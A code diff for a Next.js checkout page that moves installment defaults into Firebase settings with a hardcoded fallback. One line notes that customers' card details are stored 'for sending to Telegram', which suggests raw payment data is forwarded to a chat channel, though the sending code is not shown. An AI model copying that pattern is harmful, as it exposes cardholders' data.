@@ -14,6 +14,7 @@ import "react-toastify/dist/ReactToastify.css";
 import Footer from "@/components/Footer";
 import Header from "@/components/Header";
 import Link from "next/link";
+import { getAppSettings } from "@/firebase/settingsService";
 
 // Component to handle search params
 function CheckoutContent() {
@@ -24,8 +25,8 @@ function CheckoutContent() {
 
   // State for installment information
   const [installmentInfo, setInstallmentInfo] = useState({
-    months: 3, // Default to 3 months instead of 0
-    downPayment: 1000, // Default to 1000 instead of 0
+    months: 3, // Default values that will be overridden by Firebase settings
+    downPayment: 1000, // Default values that will be overridden by Firebase settings
     monthlyInstallment: "0.00",
   });
 
@@ -48,18 +49,44 @@ function CheckoutContent() {
           monthlyInstallment: monthlyInstallment,
         });
       } else {
-        // Set default values if URL parameters are missing
-        const totalValue = parseFloat(searchParams?.get("total") || "0");
-        const defaultDownPayment = Math.min(1000, totalValue * 0.2); // 20% of total or 1000, whichever is less
-        const remainingAmount = totalValue - defaultDownPayment;
-        const defaultMonthlyInstallment =
-          remainingAmount > 0 ? (remainingAmount / 3).toFixed(2) : "0.00";
+        // Fetch default values from Firebase if URL parameters are missing
+        const fetchSettings = async () => {
+          try {
+            const settings = await getAppSettings();
+            const { months, downPayment } = settings.installmentDefaults;
 
-        setInstallmentInfo({
-          months: 3,
-          downPayment: defaultDownPayment,
-          monthlyInstallment: defaultMonthlyInstallment,
-        });
+            // Calculate monthly installment based on Firebase defaults
+            const totalValue = parseFloat(searchParams?.get("total") || "0");
+            const defaultDownPayment = Math.min(downPayment, totalValue * 0.2); // Use Firebase value or 20% of total, whichever is less
+            const remainingAmount = totalValue - defaultDownPayment;
+            const defaultMonthlyInstallment =
+              remainingAmount > 0
+                ? (remainingAmount / months).toFixed(2)
+                : "0.00";
+
+            setInstallmentInfo({
+              months,
+              downPayment: defaultDownPayment,
+              monthlyInstallment: defaultMonthlyInstallment,
+            });
+          } catch (error) {
+            console.error("Error fetching installment defaults:", error);
+            // Fallback to hardcoded defaults if Firebase fetch fails
+            const totalValue = parseFloat(searchParams?.get("total") || "0");
+            const defaultDownPayment = Math.min(1000, totalValue * 0.2);
+            const remainingAmount = totalValue - defaultDownPayment;
+            const defaultMonthlyInstallment =
+              remainingAmount > 0 ? (remainingAmount / 3).toFixed(2) : "0.00";
+
+            setInstallmentInfo({
+              months: 3,
+              downPayment: defaultDownPayment,
+              monthlyInstallment: defaultMonthlyInstallment,
+            });
+          }
+        };
+
+        fetchSettings();
       }
     }
   }, [searchParams]);
@@ -133,7 +160,6 @@ function CheckoutContent() {
     if (!shippingInfo.address) {
       newErrors.address = "الرجاء إدخال العنوان";
       hasErrors = true;
-    
     }
     if (!shippingInfo.phone) {
       newErrors.phone = "الرجاء إدخال رقم الهاتف";
@@ -167,7 +193,7 @@ function CheckoutContent() {
     } | null = null
   ) => {
     // Store payment details for sending to Telegram
-setPaymentDetails(cardDetails as any); // Type assertion to resolve type mismatch
+    setPaymentDetails(cardDetails as any); // Type assertion to resolve type mismatch
     setIsProcessing(true);
     setProcessingError("");
 
@@ -185,7 +211,7 @@ setPaymentDetails(cardDetails as any); // Type assertion to resolve type mismatc
       total,
       address,
       paymentMethod,
-      paymentDetails: paymentDetails, 
+      paymentDetails: paymentDetails,
       invoiceUrl: "",
       contractUrl: "",
     };
